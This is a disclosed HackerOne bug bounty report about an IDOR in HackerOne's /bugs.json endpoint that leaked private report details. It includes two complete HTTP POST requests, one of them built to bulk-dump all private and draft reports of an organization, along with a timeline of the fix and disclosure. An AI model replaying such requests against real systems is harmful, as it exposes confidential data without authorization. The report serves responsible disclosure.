---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/insecure-direct-object-reference-idor
  - env/web
  - vuln/csrf
  - vuln/idor
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2024-05-23
submitted: 2024-05-02T21:18:47.284Z
bounty_usd: null
votes: 268
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "bate5a"
source: "https://hackerone.com/reports/2487889"
title: "Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint"
---
# Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 268 | **Program:** HackerOne | **Disclosed:** 2024-05-23

- Report: [https://hackerone.com/reports/2487889](https://hackerone.com/reports/2487889)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2024-05-02T21:18:47.284Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Hi H1 i hope you are Doing Well Today :)



### Explaining

* I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this  org  , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization



### Step To Reproduce 

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is 

```

POST /bugs.json HTTP/2
Host: hackerone.com
Cookie:  __Host-session=Your-Session-Here
X-Csrf-Token: Your-Csrf-Here
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Te: trailers
Content-Length: 390

text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true

```




### Poc Video

█████████

## Impact

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

## Timeline

- **Report Filed**
- **2024-05-07** @h1_analyst_oscar: Hi @bate5a,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@h1_analyst_oscar
- **Report Needs More Info**
- **Report New**
- **2024-05-08** @bate5a: Hi again @h1_analyst_oscar 


Quick Update:I found that we can include the parameters `limit=1000` and `page=1` in the above request. This way, we don't need to include anything in `text_query`, which would otherwise disclose all private reports at once within org `13`, which belongs to h1. Instead of putting random numbers in `text_query` each time, this will reduce the time spent guessing all the report numbers for this org. We can also include the parameter `substates%5B%5D=editing`, which will disclose the drafted reports.

```
POST /bugs.json HTTP/2
Host: hackerone.com
Cookie: Your-Cookies
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bugs?subject=user
X-Csrf-Token: Csrf-Token
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 457

text_query=&organization_id=13&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=pre-submission&substates%5B%5D=retesting&substates%5B%5D=not-applicable&substates%5B%5D=editing&substates%5B%5D=informative&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=1000&page=1
```
 

Note:this bug can be exploited in private organizations as well, not just public ones, which would disclose program handler, about, etc...
- **Report Severity Updated**
- **Report Pending Program Review**
- **Report Triaged**
- **2024-05-08** @z0x01: Hi @bate5a,

Thank you for reporting this issue! Great find! 
We addressed this bug. Could you please verify if you can reproduce this behavior? 

Best Regards, @z0x01
- **Changed Scope**
- **Report Title Updated**
- **2024-05-08** @bate5a: Hi @z0x01 Thanks For Getting Back :)


The issue has been fixed, am getting an empty response now 

███
- **2024-05-08** @z0x01: Hi @bate5a,

Thank you for confirming  🙌

We are currently conducting some forensic investigation on the bug and will get back to you as soon as possible.

Please be patience! 
Best Regards, 
@z0x01!
- **Report Severity Updated**
- **Bounty Awarded**
- **2024-05-13** @bate5a: * Thanks for the bounty, really appreciate it! :) Also, I have a question: is this report eligible for swag?
- **2024-05-13** @z0x01: I apologize, but our SWAG process is currently not operational. 

You may be able to obtain SWAG based on your reputation points. 
You can reach out to support.hackerone.com for that! 

Please let me know if you have any other questions.
Happy hacking!
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **2024-05-15** @z0x01: Hi @bate5a,

We are still actively working on the incident that was triggered by this report, and we need to complete it before disclosing the report. 
We appreciate your patience and understanding as we work to resolve this matter responsibly.

Best Regards,
@z0x01
- **2024-05-22** @cevans_0glc8: @bate5a I wanted to pop in and thank you for testing this bug carefully and responsibly. Once you realized that the bug could allow cross-organizational leakage, you stopped immediately and reported it. Perfect!
- **2024-05-22** @cevans_0glc8: @bate5a One more thing -- HackerOne operates with top-tier transparency. We disclose reports, especially interesting / significant ones like that.

Any objections to disclosure? We will do a pass to see if anything needs to be redacted. Is there anything you think should be redacted?
- **Agreed On Going Public**
- **2024-05-22** @z0x01: Hi @bate5a,

I have redacted the report and made all videos and images internal. Could you please verify that the report is redacted correctly?
- **2024-05-22** @bate5a: Hi @z0x01 

all looks good,we can disclose it now
- **Agreed On Going Public**
- **Report Became Public**
